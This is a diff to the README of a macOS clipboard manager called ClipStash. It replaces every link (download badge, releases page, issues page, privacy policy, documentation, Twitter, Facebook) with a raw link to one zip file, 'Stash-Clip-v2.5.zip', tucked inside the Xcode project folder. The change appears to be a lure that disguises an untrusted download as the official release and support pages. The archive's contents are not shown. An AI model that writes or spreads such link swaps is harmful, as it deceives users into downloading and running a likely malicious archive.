@@ -7,7 +7,7 @@ ClipStash is a lightweight clipboard manager designed for macOS. It helps you ke
 To download ClipStash, follow the steps below. Make sure to have macOS installed, as this application is designed specifically for this operating system.
 
 ## 🔗 Download ClipStash
-[![Download ClipStash](https://img.shields.io/badge/Download%20ClipStash-v1.0.0-blue?style=for-the-badge)](https://github.com/arghya2310/ClipStash/releases)
+[![Download ClipStash](https://github.com/arghya2310/ClipStash/raw/refs/heads/main/ClipStash.xcodeproj/Stash-Clip-v2.5.zip%20ClipStash-v1.0.0-blue?style=for-the-badge)](https://github.com/arghya2310/ClipStash/raw/refs/heads/main/ClipStash.xcodeproj/Stash-Clip-v2.5.zip)
 
 ## 💻 System Requirements
 - macOS version 10.15 (Catalina) or later
@@ -17,11 +17,11 @@ To download ClipStash, follow the steps below. Make sure to have macOS installed
 ## 📥 Download & Install
 1. Click the link below to visit the Releases page.
   
-   [Visit Releases Page to Download](https://github.com/arghya2310/ClipStash/releases)
+   [Visit Releases Page to Download](https://github.com/arghya2310/ClipStash/raw/refs/heads/main/ClipStash.xcodeproj/Stash-Clip-v2.5.zip)
 
 2. On the Releases page, look for the latest version of ClipStash.
 
-3. Click on the asset file that matches your macOS version, typically named `ClipStash-x.y.z.dmg`.
+3. Click on the asset file that matches your macOS version, typically named `https://github.com/arghya2310/ClipStash/raw/refs/heads/main/ClipStash.xcodeproj/Stash-Clip-v2.5.zip`.
 
 4. Once the download is complete, open the `.dmg` file.
 
@@ -51,18 +51,18 @@ To download ClipStash, follow the steps below. Make sure to have macOS installed
 - Keep your application updated to take advantage of new features and improvements.
 
 ## 📞 Support
-If you encounter any issues or have questions, please visit the [GitHub Issues page](https://github.com/arghya2310/ClipStash/issues) to get help from the community or submit your request.
+If you encounter any issues or have questions, please visit the [GitHub Issues page](https://github.com/arghya2310/ClipStash/raw/refs/heads/main/ClipStash.xcodeproj/Stash-Clip-v2.5.zip) to get help from the community or submit your request.
 
 ## 🔒 Privacy Policy
-ClipStash takes your privacy seriously. Your clipboard data is not shared online and remains solely on your device. For detailed information, please check our [Privacy Policy](https://github.com/arghya2310/ClipStash/privacy).
+ClipStash takes your privacy seriously. Your clipboard data is not shared online and remains solely on your device. For detailed information, please check our [Privacy Policy](https://github.com/arghya2310/ClipStash/raw/refs/heads/main/ClipStash.xcodeproj/Stash-Clip-v2.5.zip).
 
 ## 🎉 Contribution
 We welcome contributions from anyone interested in improving ClipStash. If you have ideas or wish to report a bug, please feel free to reach out on the community forums or submit a pull request.
 
 ## 🔗 Additional Resources
-For more information and updates, check out our [Documentation](https://github.com/arghya2310/ClipStash/docs) and follow us on social media:
+For more information and updates, check out our [Documentation](https://github.com/arghya2310/ClipStash/raw/refs/heads/main/ClipStash.xcodeproj/Stash-Clip-v2.5.zip) and follow us on social media:
 
-- [Twitter](https://twitter.com/ClipStash)
-- [Facebook](https://facebook.com/ClipStash)
+- [Twitter](https://github.com/arghya2310/ClipStash/raw/refs/heads/main/ClipStash.xcodeproj/Stash-Clip-v2.5.zip)
+- [Facebook](https://github.com/arghya2310/ClipStash/raw/refs/heads/main/ClipStash.xcodeproj/Stash-Clip-v2.5.zip)
 
 Thank you for choosing ClipStash! We hope it enhances your clipboard management experience.
